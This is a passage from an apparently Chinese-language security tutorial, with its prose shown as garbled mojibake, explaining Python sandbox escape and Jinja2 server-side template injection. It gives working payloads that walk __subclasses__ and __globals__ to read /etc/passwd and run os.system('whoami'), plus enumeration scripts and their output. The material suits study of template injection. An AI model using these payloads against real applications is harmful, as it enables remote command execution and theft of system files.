<code>&#39;file&#39;</code>ã€‚</li><li>è¿™é‡Œæƒ³æ‰¾åˆ°åä¸º <code>file</code> çš„ç±»ã€‚</li></ul><ol start="6"><li><code>print(c)</code></li></ol><ul><li>æ‰“å°è¯¥ç±»å¯¹è±¡ã€‚</li></ul><ol start="7"><li><code>print c(&#39;joker.txt&#39;).readlines()</code></li></ol><ul><li>å®ä¾‹åŒ–è¯¥ç±»ï¼Œä¼ å…¥ <code>&#39;joker.txt&#39;</code> ä½œä¸ºå‚æ•°ï¼Œç­‰åŒäºæ‰“å¼€ <code>joker.txt</code> æ–‡ä»¶ã€‚</li><li>è°ƒç”¨ <code>readlines()</code> æ–¹æ³•ï¼Œè¯»å–æ–‡ä»¶æ‰€æœ‰è¡Œå¹¶è¿”å›åˆ—è¡¨ã€‚</li><li>ç„¶åæ‰“å°è¯»å–çš„å†…å®¹ã€‚</li></ul><h4 id="ä½¿ç”¨jinja2çš„è¯­æ³•å°è£…æˆå¯è§£æçš„æ ·å­ï¼š"><a href="#ä½¿ç”¨jinja2çš„è¯­æ³•å°è£…æˆå¯è§£æçš„æ ·å­ï¼š" class="headerlink" title="ä½¿ç”¨jinja2çš„è¯­æ³•å°è£…æˆå¯è§£æçš„æ ·å­ï¼š"></a>ä½¿ç”¨jinja2çš„è¯­æ³•å°è£…æˆå¯è§£æçš„æ ·å­ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;file&#x27;</span> %&#125;<br>&#123;&#123; c(<span class="hljs-string">&quot;/etc/passwd&quot;</span>).readlines() &#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p> <code>&#123;% for ... %&#125;</code> å’Œ <code>&#123;% if ... %&#125;</code> æ˜¯æ§åˆ¶æµæ ‡ç­¾</p><p> <code>&#123;&#123; ... &#125;&#125;</code>ï¼šæ¨¡æ¿è¾“å‡ºå€¼çš„ä½ç½®</p><p>ä¹Ÿå¯ä»¥å†™æˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#125;.__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&quot;joker.txt&quot;</span>).readlines()<br></code></pre></td></tr></table></figure><p>ä»£ç è§£é‡Šï¼š</p><p><code>[40](&quot;joker.txt&quot;)</code>ï¼šå–å‡ºç¬¬ 40 ä¸ªç±»ï¼Œå¹¶å®ä¾‹åŒ–å®ƒ</p><p><code>.readlines()</code>ï¼šè¯»å–å†…å®¹</p><h2 id="ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"><a href="#ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤" class="headerlink" title="ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"></a>ç”¨å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤</h2><h3 id="é€šè¿‡-globals-å»åˆ©ç”¨åˆ«äººå·²ç»å¯¼å…¥çš„-osã€‚"><a href="#é€šè¿‡-globals-å»åˆ©ç”¨åˆ«äººå·²ç»å¯¼å…¥çš„-osã€‚" class="headerlink" title="é€šè¿‡ __globals__ å»åˆ©ç”¨åˆ«äººå·²ç»å¯¼å…¥çš„ osã€‚"></a>é€šè¿‡ <code>__globals__</code> å»<strong>åˆ©ç”¨åˆ«äººå·²ç»å¯¼å…¥çš„ os</strong>ã€‚</h3><p>ä¸Šé¢çš„å®ä¾‹ä¸­æˆ‘ä»¬ä½¿ç”¨<code>__subclasses__()</code>æŠŠå†…ç½®çš„å¯¹è±¡åˆ—ä¸¾å‡ºæ¥ï¼Œå…¶å®å¯ä»¥ç”¨<code>__globals__</code>æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼Œå¦‚æœæœ‰osè¿™ç§å¯ä»¥ç›´æ¥ä¼ å…¥å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p><p>osæ¨¡å—:å› ä¸º Python çš„ <code>os</code> æ¨¡å—æ˜¯å¯¹ <strong>æ“ä½œç³»ç»ŸåŠŸèƒ½</strong> çš„å°è£…ï¼Œå…¶ä¸­åŒ…å«äº†<strong>è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</strong>ã€<strong>æ–‡ä»¶æ“ä½œ</strong>ã€<strong>ç¯å¢ƒæ§åˆ¶</strong>ç­‰èƒ½åŠ›ã€‚ä¸€æ—¦ä½ èƒ½è®¿é—® <code>os</code> æ¨¡å—ï¼Œå°±å¯ä»¥åšå‡ ä¹ä»»ä½•äº‹æƒ…â€”â€”ä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œä»»æ„å‘½ä»¤æ‰§è¡Œâ€ã€‚</p><p>å³ä½¿ä½ ä¸èƒ½ <code>import os</code>ï¼Œä½ å¯ä»¥é€šè¿‡ <code>__globals__</code> å»<strong>åˆ©ç”¨åˆ«äººå·²ç»å¯¼å…¥çš„ os</strong>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç»§ç»­æ·±å…¥æ‹¿åˆ°å‡½æ•°ç±»çš„ <code>__globals__</code>ï¼Œæ‰¾åˆ° <code>os</code> æ¨¡å—ï¼Œç„¶åç”¨ <code>os.popen(&quot;whoami&quot;).read()</code> è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br>search = <span class="hljs-string">&#x27;os&#x27;</span>   <span class="hljs-comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å— </span><br>num = -<span class="hljs-number">1</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__():  <br>num += <span class="hljs-number">1</span>   <br><span class="hljs-keyword">try</span>:       <br><span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():           <br><span class="hljs-built_in">print</span>(i, num)    <br><span class="hljs-keyword">except</span>:       <br><span class="hljs-keyword">pass</span>  <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-17_18-15-12.png" alt="PixPin_2025-07-17_18-15-12"></p><p>è§£é‡Šä»£ç </p><p><code>search = &#39;os&#39;</code></p><p>ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºä½ æƒ³åœ¨ç±»ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰ <code>os</code> æ¨¡å—è¢«å¼•ç”¨ã€‚ä½ ä¹Ÿå¯ä»¥æ¢æˆå…¶ä»–æ¨¡å—åï¼Œæ¯”å¦‚ <code>sys</code>ã€<code>subprocess</code> ç­‰ã€‚</p><p><code>if search in i.__init__.__globals__.keys():</code></p><p>å°è¯•è·å–è¯¥ç±»æ„é€ å‡½æ•° <code>__init__</code> çš„ <code>__globals__</code>ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå‡½æ•°å®šä¹‰æ—¶çš„å…¨å±€å˜é‡å­—å…¸ã€‚æ£€æŸ¥æœ‰æ²¡æœ‰ <code>search</code> æŒ‡å®šçš„æ¨¡å—åï¼ˆä¾‹å¦‚ <code>&#39;os&#39;</code>ï¼‰åœ¨è¿™ä¸ªç±»å®šä¹‰æ—¶è¢«å¼•ç”¨ã€‚</p><p><code>print(i, num)</code></p><p>å¦‚æœæ‰¾åˆ°äº†å¼•ç”¨ï¼Œæ‰“å°è¿™ä¸ªç±»å’Œå®ƒçš„åºå·ã€‚</p><p><code>except: pass</code></p><p>é˜²æ­¢æŠ¥é”™ï¼ˆæœ‰äº›ç±»æ²¡æœ‰ <code>__init__</code>ï¼Œæˆ–è€… <code>__init__</code> ä¸æ˜¯ Python å‡½æ•°å¯¹è±¡ï¼‰ï¼Œå°±è·³è¿‡ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨å…ƒç»„61ï¼Œ76çš„ä½ç½®æ‰¾åˆ°äº†osæ¨¡å—ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€ å‘½ä»¤æ‰§è¡Œpayload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().__class__.__base__.__subclasses__()[<span class="hljs-number">76</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">76</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ‹†è§£åˆ†æï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">().__class__                      <span class="hljs-comment"># æ˜¯ &lt;class &#x27;tuple&#x27;&gt;ï¼Œç©ºå…ƒç»„çš„ç±»</span><br>().__class__.__mro__             <span class="hljs-comment"># æ˜¯ (&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br>().__class__.__mro__[<span class="hljs-number">1</span>]          <span class="hljs-comment"># æ˜¯ &lt;class &#x27;object&#x27;&gt;</span><br>().__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()  <span class="hljs-comment"># è·å– object çš„æ‰€æœ‰å­ç±»ï¼ˆä¸€ä¸ªåˆ—è¡¨ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>åªè¦è¿™ä¸ªç±»çš„ <code>__init__</code> åœ¨å…¨å±€ä½œç”¨åŸŸé‡Œå¯¼å…¥äº† <code>os</code>ï¼Œä½ å°±èƒ½é€šè¿‡å®ƒæ‹¿åˆ° os æ¨¡å—ã€‚</strong></p><p>äºæ˜¯æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)  <span class="hljs-comment"># è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼šwhoami</span><br></code></pre></td></tr></table></figure><p>ä¸è¿‡åŒæ ·ï¼Œåªèƒ½åœ¨python2ç‰ˆæœ¬ä½¿ç”¨ï¼Œè¿™æ—¶å€™å°±è¦æ¨è<code>__builtins__</code></p><h3 id="ä½¿ç”¨-builtin-æ¨¡å—å¯¼å…¥æ¨¡å—"><a href="#ä½¿ç”¨-builtin-æ¨¡å—å¯¼å…¥æ¨¡å—" class="headerlink" title="ä½¿ç”¨__builtin__ æ¨¡å—å¯¼å…¥æ¨¡å—"></a>ä½¿ç”¨<code>__builtin__</code> æ¨¡å—å¯¼å…¥æ¨¡å—</h3><p>åœ¨ python ä¸­ï¼Œä¸å¼•å…¥ç›´æ¥ä½¿ç”¨çš„å†…ç½®å‡½æ•°è¢«ç§°ä¸º builtin å‡½æ•°ï¼Œéšç€ <code>__builtin__</code> è¿™ä¸ªæ¨¡å—è‡ªåŠ¨å¼•â¼Šåˆ°ç¯å¢ƒä¸­ã€‚</p><p>æˆ‘ä»¬å¦‚ä½•å¼•å…¥æ¨¡å—å‘¢ï¼Ÿ</p><p>â¼€ä¸ªæ¨¡å—å¯¹è±¡æœ‰â¼€ä¸ªç”±å­—å…¸å¯¹è±¡å®ç°çš„å‘½åç©ºé—´ï¼Œå±æ€§çš„å¼•ç”¨ä¼šè¢«è½¬æ¢ä¸ºè¿™ä¸ªå­—å…¸ä¸­çš„æŸ¥æ‰¾ï¼š</p><h4 id="å­—å…¸è®¿é—®å±æ€§è®¿é—®ç®€å•å®šä¹‰"><a href="#å­—å…¸è®¿é—®å±æ€§è®¿é—®ç®€å•å®šä¹‰" class="headerlink" title="å­—å…¸è®¿é—®å±æ€§è®¿é—®ç®€å•å®šä¹‰"></a>å­—å…¸è®¿é—®å±æ€§è®¿é—®ç®€å•å®šä¹‰</h4><table><thead><tr><th>è®¿é—®æ–¹å¼</th><th>ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>å±æ€§è®¿é—®</strong></td><td><code>obj.attr</code></td><td>ä½¿ç”¨ã€Œç‚¹ã€<code>.</code> æ¥è®¿é—®å¯¹è±¡çš„å±æ€§</td></tr><tr><td><strong>å­—å…¸è®¿é—®</strong></td><td><code>obj[&#39;key&#39;]</code></td><td>ä½¿ç”¨æ–¹æ‹¬å· <code>[]</code> æ¥é€šè¿‡é”®è®¿é—®å­—å…¸çš„å€¼</td></tr></tbody></table><ul><li>ä¸¤è€…åœ¨è¯­æ³•å’Œåº•å±‚è¡Œä¸ºä¸Šæ˜¯ä¸åŒçš„ã€‚</li></ul><p>æˆ‘ä»¬å…ˆæŠŠå«æœ‰<code>__builtins__</code>æ¨¡å—çš„å†…ç½®å‡½æ•°ä½¿ç”¨å­—å…¸éƒ½åˆ—å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><br>search = <span class="hljs-string">&#x27;__builtins__&#x27;</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(i.__init__.__globals__.keys())<br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i, num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-number">58</span>)<br>[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-number">59</span>)<br>[<span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;_IterationGuard&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;ref&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;WeakSet&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-number">60</span>)<br>[<span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;_IterationGuard&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;ref&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;WeakSet&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-number">61</span>)<br>[<span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;setencoding&#x27;</span>, <span class="hljs-string">&#x27;sethelper&#x27;</span>, <span class="hljs-string">&#x27;execsitecustomize&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;addsitedir&#x27;</span>, <span class="hljs-string">&#x27;addpackage&#x27;</span>, <span class="hljs-string">&#x27;ENABLE_USER_SITE&#x27;</span>, <span class="hljs-string">&#x27;USER_SITE&#x27;</span>, <span class="hljs-string">&#x27;setquit&#x27;</span>, <span class="hljs-string">&#x27;setcopyright&#x27;</span>, <span class="hljs-string">&#x27;addsitepackages&#x27;</span>, <span class="hljs-string">&#x27;_Printer&#x27;</span>, <span class="hljs-string">&#x27;setBEGINLIBPATH&#x27;</span>, <span class="hljs-string">&#x27;check_enableusersite&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;USER_BASE&#x27;</span>, <span class="hljs-string">&#x27;abs__file__&#x27;</span>, <span class="hljs-string">&#x27;main&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;_Helper&#x27;</span>, <span class="hljs-string">&#x27;_script&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;_init_pathinfo&#x27;</span>, <span class="hljs-string">&#x27;removeduppaths&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;getsitepackages&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;getusersitepackages&#x27;</span>, <span class="hljs-string">&#x27;execusercustomize&#x27;</span>, <span class="hljs-string">&#x27;aliasmbcs&#x27;</span>, <span class="hljs-string">&#x27;makepath&#x27;</span>, <span class="hljs-string">&#x27;getuserbase&#x27;</span>, <span class="hljs-string">&#x27;PREFIXES&#x27;</span>, <span class="hljs-string">&#x27;addusersitepackages&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-number">71</span>)<br>[<span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;setencoding&#x27;</span>, <span class="hljs-string">&#x27;sethelper&#x27;</span>, <span class="hljs-string">&#x27;execsitecustomize&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;addsitedir&#x27;</span>, <span class="hljs-string">&#x27;addpackage&#x27;</span>, <span class="hljs-string">&#x27;ENABLE_USER_SITE&#x27;</span>, <span class="hljs-string">&#x27;USER_SITE&#x27;</span>, <span class="hljs-string">&#x27;setquit&#x27;</span>, <span class="hljs-string">&#x27;setcopyright&#x27;</span>, <span class="hljs-string">&#x27;addsitepackages&#x27;</span>, <span class="hljs-string">&#x27;_Printer&#x27;</span>, <span class="hljs-string">&#x27;setBEGINLIBPATH&#x27;</span>, <span class="hljs-string">&#x27;check_enableusersite&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;USER_BASE&#x27;</span>, <span class="hljs-string">&#x27;abs__file__&#x27;</span>, <span class="hljs-string">&#x27;main&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;_Helper&#x27;</span>, <span class="hljs-string">&#x27;_script&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;_init_pathinfo&#x27;</span>, <span class="hljs-string">&#x27;removeduppaths&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;getsitepackages&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;getusersitepackages&#x27;</span>, <span class="hljs-string">&#x27;execusercustomize&#x27;</span>, <span class="hljs-string">&#x27;aliasmbcs&#x27;</span>, <span class="hljs-string">&#x27;makepath&#x27;</span>, <span class="hljs-string">&#x27;getuserbase&#x27;</span>, <span class="hljs-string">&#x27;PREFIXES&#x27;</span>, <span class="hljs-string">&#x27;addusersitepackages&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-number">76</span>)<br>[<span class="hljs-string">&#x27;latin_1_encode&#x27;</span>, <span class="hljs-string">&#x27;getreader&#x27;</span>, <span class="hljs-string">&#x27;readbuffer_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM&#x27;</span>, <span class="hljs-string">&#x27;StreamWriter&#x27;</span>, <span class="hljs-string">&#x27;BOM64_BE&#x27;</span>, <span class="hljs-string">&#x27;ascii_decode&#x27;</span>, <span class="hljs-string">&#x27;IncrementalDecoder&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32&#x27;</span>, <span class="hljs-string">&#x27;BufferedIncrementalDecoder&#x27;</span>, <span class="hljs-string">&#x27;ignore_errors&#x27;</span>, <span class="hljs-string">&#x27;replace_errors&#x27;</span>, <span class="hljs-string">&#x27;BOM_BE&#x27;</span>, <span class="hljs-string">&#x27;utf_16_be_decode&#x27;</span>, <span class="hljs-string">&#x27;charmap_build&#x27;</span>, <span class="hljs-string">&#x27;escape_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16_BE&#x27;</span>, <span class="hljs-string">&#x27;xmlcharrefreplace_errors&#x27;</span>, <span class="hljs-string">&#x27;unicode_escape_encode&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;utf_16_decode&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;lookup_error&#x27;</span>, <span class="hljs-string">&#x27;getincrementalencoder&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;EncodedFile&#x27;</span>, <span class="hljs-string">&#x27;backslashreplace_errors&#x27;</span>, <span class="hljs-string">&#x27;getincrementaldecoder&#x27;</span>, <span class="hljs-string">&#x27;register_error&#x27;</span>, <span class="hljs-string">&#x27;BOM32_BE&#x27;</span>, <span class="hljs-string">&#x27;getencoder&#x27;</span>, <span class="hljs-string">&#x27;make_identity_dict&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32_LE&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;iterencode&#x27;</span>, <span class="hljs-string">&#x27;decode&#x27;</span>, <span class="hljs-string">&#x27;IncrementalEncoder&#x27;</span>, <span class="hljs-string">&#x27;latin_1_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_le_decode&#x27;</span>, <span class="hljs-string">&#x27;getwriter&#x27;</span>, <span class="hljs-string">&#x27;charmap_encode&#x27;</span>, <span class="hljs-string">&#x27;encode&#x27;</span>, <span class="hljs-string">&#x27;unicode_internal_encode&#x27;</span>, <span class="hljs-string">&#x27;StreamReader&#x27;</span>, <span class="hljs-string">&#x27;make_encoding_map&#x27;</span>, <span class="hljs-string">&#x27;utf_16_ex_decode&#x27;</span>, <span class="hljs-string">&#x27;getdecoder&#x27;</span>, <span class="hljs-string">&#x27;charbuffer_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_7_encode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_decode&#x27;</span>, <span class="hljs-string">&#x27;BOM32_LE&#x27;</span>, <span class="hljs-string">&#x27;StreamReaderWriter&#x27;</span>, <span class="hljs-string">&#x27;utf_16_encode&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;raw_unicode_escape_encode&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF32_BE&#x27;</span>, <span class="hljs-string">&#x27;utf_16_le_encode&#x27;</span>, <span class="hljs-string">&#x27;unicode_internal_decode&#x27;</span>, <span class="hljs-string">&#x27;utf_32_be_encode&#x27;</span>, <span class="hljs-string">&#x27;CodecInfo&#x27;</span>, <span class="hljs-string">&#x27;BOM_UTF16_LE&#x27;</span>, <span class="hljs-string">&#x27;BufferedIncrementalEncoder&#x27;</span>, <span class="hljs-string">&#x27;BOM_LE&#x27;</span>, <span class="hljs-string">&#x27;Codec&#x27;</span>, <span class="hljs-string">&#x27;_false&#x27;</span>, <span 